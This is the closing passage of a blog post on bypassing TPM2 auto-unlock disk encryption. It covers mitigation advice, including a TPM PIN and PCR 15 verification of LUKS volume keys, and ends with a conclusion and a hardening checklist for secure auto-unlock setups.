+known about this issue.</p><p><em>If you happen to have written about this before, please
+update your post(s) to make your readers aware of the implications!
+Thank you!</em></p><p>Unfortunately, I have also not found a simple solution that I
+can recommend to you right now to actually fix the issue (except
+for NixOS, <a href="https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/#crude-implementation-of-pcr15-verification">see above</a>). Enabling mandatory LUKS key measurement and PCR 15
+verification in the initrd is just not something that is easily
+available as a module or script right now (January 2025), so you&#39;d
+have to implement it yourself.</p><p>From what I learned when researching this, a proper
+implementation would need to at least:</p><ul><li>Predict the value of PCR 15 value at initrd generation
+time</li><li>Implicitly sign this value by adding it to the initrd</li><li>Extend PCR 15 at boot time with the volume key of every
+decrypted LUKS volume, while ensuring in a deterministic decryption
+order</li><li>Verify PCR 15 against the known and signed value
+<em>before</em> utilizing any data from one of the the encrypted
+disks</li></ul><p>The easiest way to protect your data right now is to bite the
+bullet and add a TPM PIN, for example by using
+<code>systemd-cryptenroll --tpm2-with-pin=yes [...]</code> when
+enrolling your key.</p><h2 id="conclusion"><span><span><a href="#conclusion" aria-label="Anchor link for: conclusion">🔗</a></span> Conclusion</span></h2><p>We&#39;ve successfully carried out a filesystem confusion attack on
+two completely different systems to extract their secret volume
+key, and have seen that the majority of articles about TPM2
+auto-unlock setups are likely vulnerable to this attack.</p><p>We learned that this problem is not easily fixed, as it requires
+an additional verification step that cannot simply be activated on
+most distributions at present. It is critical to ensure that there
+is an unbroken chain of trust from the bootloader to the actual
+system.</p><p>Here is a checklist of things to consider when setting up TPM2
+auto-unlock:</p><ul><li>Your kernel and initramfs are both signed and verified (UKI or
+MOK), or you are using PCR 9 together with a shim that hashes the
+images at boot time.</li><li>You have enrolled a LUKS key in the TPM2 on at least PCR 7 (+9
+if necessary).</li><li>If you are decrypting multiple devices in the initrd, their
+decryption order is deterministic.</li><li>After decryption - and before any user executable is called -
+the initramfs verifies the identity of all encrypted disks,
+preferably by measuring a derivative of the volume key into PCR 15
+for each disk.</li><li>Your initrd&#39;s emergency shell (if any) is
+password-protected.</li><li>Your bootloader does not allow you to alter the kernel command
+line, or you&#39;ve included a PCR used in the LUKS key enrollment that
+depends on the kernel command line.</li></ul><p>Thank you for taking the time to read this article - I hope you
+found it both interesting and enjoyable 😊.</p><hr/><p>If you&#39;d like to send me feedback or just reach out, feel free
+to contact me on <a href="https://matrix.to/#/@oddlama:matrix.org">Matrix</a>!</p><p>Discussion threads for this post:</p><ul><li><a href="https://news.ycombinator.com/item?id=42733640">Hacker
+News</a></li><li><a href="https://www.reddit.com/r/linux/comments/1i2pf38/bypassing_disk_encryption_on_systems_with">Reddit</a></li></ul></div></div>
+  </body>
+</html>
